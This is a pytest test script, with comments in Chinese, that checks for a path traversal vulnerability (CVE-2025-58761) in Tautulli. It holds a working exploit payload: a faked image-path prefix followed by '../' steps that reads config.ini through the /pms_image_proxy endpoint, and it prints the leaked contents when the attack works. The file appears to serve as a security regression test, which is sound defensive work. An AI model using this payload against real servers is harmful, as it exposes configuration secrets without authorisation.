import requests
import pytest
import sys

# 配置目标
TARGET_IP = "localhost"
TARGET_PORT = "8181"
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

def test_cve_2025_58761_exploit():
    """
    CVE-2025-58761: Tautulli 路径遍历漏洞测试
    目标：利用 /pms_image_proxy 或 /image 端点读取 /config/config.ini
    """
    print(f"\n[*] Target: {BASE_URL}")
    
    # 攻击 Payload: 
    # 1. 伪造前缀 interfaces/default/images/ (绕过 split 检查)
    # 2. 回溯 8 层 ../ (确保跳到根目录)
    # 3. 目标文件 config/config.ini
    traversal_path = "interfaces/default/images/../../../../../../../../config/config.ini"
    
    # 构造 URL (手动拼接 Query String 以防止 requests 自动编码)
    # 注意：我们使用 /pms_image_proxy 端点，这是最通用的
    url = f"{BASE_URL}/pms_image_proxy?img={traversal_path}&img_format=png&fallback=poster"
    
    print(f"[*] Sending Payload...")
    
    try:
        response = requests.get(url, timeout=5)
        
        # 验证逻辑
        is_success = False
        if response.status_code == 200:
            if "[General]" in response.text and "pms_uuid" in response.text:
                is_success = True
        
        if is_success:
            print(f"[+] 漏洞利用成功! 读取到 config.ini")
            print(f"[-] 内容预览:\n{response.text[:100]}...")
            pytest.fail("读取 config.ini 敏感内容")
        else:
            print(f"[-] 攻击失败。状态码: {response.status_code}")
            # 如果是 500，说明可能代码崩了但没读到文件
            # 如果是 404，说明路径不对
            if response.status_code == 500:
                print("[-] Server Error (500) - 路径前缀可能不匹配")
            assert True
            
    except Exception as e:
        pytest.fail(f"请求发生异常: {e}")